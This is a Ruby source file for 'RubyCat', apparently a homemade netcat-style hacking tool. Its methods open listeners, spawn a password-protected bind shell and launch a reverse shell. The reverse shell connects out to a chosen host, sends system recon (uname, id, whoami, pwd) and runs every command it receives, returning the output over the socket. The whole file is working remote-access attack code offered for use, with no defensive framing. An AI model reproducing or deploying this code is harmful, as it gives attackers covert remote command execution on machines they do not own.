# RubyCat - My Ruby Version of Netcat tool
# Open Listener
# Catch Reverse Shells
# Connect to Bind Shells
# Spawn Bind Shell w/Authentication
# Spawn Reverse Shell


# To Use:
# rc = RubyCat.new                          # Initialize Class Object
#
# Now call option as desired:
# rc.listener(port.to_i, ip.to_s)           # Connect to a (Remote) Shell
# rc.listener(port.to_i)                    # Setup a Simple Listener
# rc.bind_shell(port.to_i)                  # Setup a Bind Shell
# rc.bind_shell(port.to_i, password.to_s)   # Setup a Bind Shell w/Authentication
# rc.reverse_shell(ip.to_s, port.to_i)      # Launch a Reverse Shell

class RubyCat
  def initialize
    require 'ostruct'
    require 'socket'
    require 'open3'
  end

  # Simple NetCat Type Functionality
  def listener(port=31337, ip=nil)
    # It is all in how we define our socket
    # Spawn a server or connect to one....
    if ip.nil?
      server = TCPServer.new(port)
      server.listen(1)
      @socket = server.accept
    else
      @socket = TCPSocket.open(ip, port)
    end
    # Actual  Socket Handling
    while(true)
      if(IO.select([],[],[@socket, STDIN],0))
        socket.close
        return
      end
      begin
        while( (data = @socket.recv_nonblock(100)) != "")
          STDOUT.write(data);
        end
        break
      rescue Errno::EAGAIN
      end
      begin
        while( (data = STDIN.read_nonblock(100)) != "")
          @socket.write(data);
        end
        break
      rescue Errno::EAGAIN
      rescue EOFError
        break
      end
      IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
    end
  end

  # Ruby Bind Command Shell
  # Password Required to Access, default: knock-knock
  # Send Password as first send when connecting or get rejected!
  def bind_shell(port=31337, password='knock-knock')
    # Messages for those who visit but don't have proper pass
    @greetz=["Piss Off!", "Grumble, Grumble......?", "Run along now, nothing to see here.....", "Who's There?"]

    # The number over loop is the port number the shell listens on.
    Socket.tcp_server_loop("#{port}") do |socket, client_addrinfo|
      command = socket.gets.chomp
      if command.downcase == password
        socket.puts "\nYou've Been Authenticated!\n"
        socket.puts "This Bind connection brought to you by a little Ruby Magic xD\n"
        socket.puts "Type 'EXIT' or 'QUIT' to exit shell & keep port listening..."
        socket.puts "Type 'KILL' or 'CLOSE' to close listenr for good!\n\n"
        socket.puts "Server Info: "
        begin
          if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
            count=0
            while count.to_i < 3
              if count.to_i == 0
                command="echo Winblows"
                socket.print "BUILD: "
              elsif count.to_i == 1
                command="whoami"
                socket.print "ID: "
              elsif count.to_i == 2
                command="chdir"
                socket.print "PWD: "
              end
              count = count.to_i + 1
              Open3.popen2e("#{command}") do | stdin, stdothers |
                IO.copy_stream(stdothers, socket)
              end
            end
          else
            count=0
            while count.to_i < 3
              if count.to_i == 0
                command="uname -a"
                socket.print "BUILD: \n"
              elsif count.to_i == 1
                command="id"
                socket.print "ID: "
              elsif count.to_i == 2
                command="pwd"
                socket.print "PWD: "
              end
              count = count.to_i + 1
              Open3.popen2e("#{command}") do | stdin, stdothers |
                IO.copy_stream(stdothers, socket)
              end
            end
          end
          # Then we drop to sudo shell :)
          while(true)
            socket.print "\n(RubyCat)> "
            command = socket.gets.chomp
            if command.downcase == 'exit' or command.downcase == 'quit'
              socket.puts "\ngot r00t?\n\n"
              break # Close Temporarily Since they asked nicely
            end
            if command.downcase == 'kill' or command.downcase == 'close'
              socket.puts "\ngot r00t?\n\n"
              exit # Exit Completely when asked nicely :p
            end
            # Use open3 to execute commands as we read and write through socket connection
            Open3.popen2e("#{command}") do | stdin, stdothers |
              IO.copy_stream(stdothers, socket)
            end
          end
          rescue
            socket.write "Command or file not found!\n"
            socket.write "Type EXIT or QUIT to close the session.\n"
            socket.write "Type KILL or CLOSE to kill the shell completely.\n"
            socket.write "\n\n"
            retry
          ensure
            @cleared=0
            socket.close
          end
        else
          num=randz
          socket.puts @greetz[num.to_i]
        end

    end
  end

  # Ruby Reverse Command Shell
  def reverse_shell(ip='127.0.0.1', port=31337, retries='5')
    while retries.to_i > 0
      begin
        socket = TCPSocket.new "#{ip}", "#{port}"
        break
      rescue
        # If we fail to connect, wait a few and try again
        sleep 10
        retries = retries.to_i - 1
        retry
      end
    end
    # Run commands with output sent to stdout and stderr
    begin
      socket.puts "This Reverse connection brought to you by a little Ruby Magic xD\n\n"
      socket.puts "Server Info:"
      # First we scrape some basic info....
      if RUBY_PLATFORM =~ /win32|win64|\.NET|windows|cygwin|mingw32/i
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="echo Winblows"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="whoami"
            socket.print "ID: "
          elsif count.to_i == 2
            command="chdir"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Open3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      else
        count=0
        while count.to_i < 3
          if count.to_i == 0
            command="uname -a"
            socket.print "BUILD: \n"
          elsif count.to_i == 1
            command="id"
            socket.print "ID: "
          elsif count.to_i == 2
            command="pwd"
            socket.print "PWD: "
          end
          count = count.to_i + 1
          # Oen3 to exec
          Open3.popen2e("#{command}") do | stdin, stdothers |
            IO.copy_stream(stdothers, socket)
          end
        end
      end
      # Now we drop to Pseudo shell :)
      while(true)
        socket.print "\n(RubyCat)> "
        command = socket.gets.chomp
        if command.downcase == 'exit' or command.downcase == 'quit'
          socket.puts "\nOK, closing connection....\n"
          socket.puts "\ngot r00t?\n\n"
          break # Exit when asked nicely :p
        end
        # Open3 to exec
        Open3.popen2e("#{command}") do | stdin, stdothers |
          IO.copy_stream(stdothers, socket)
        end
      end
    rescue
      # If we fail for some reason, try again
      retry
    end
  end
end
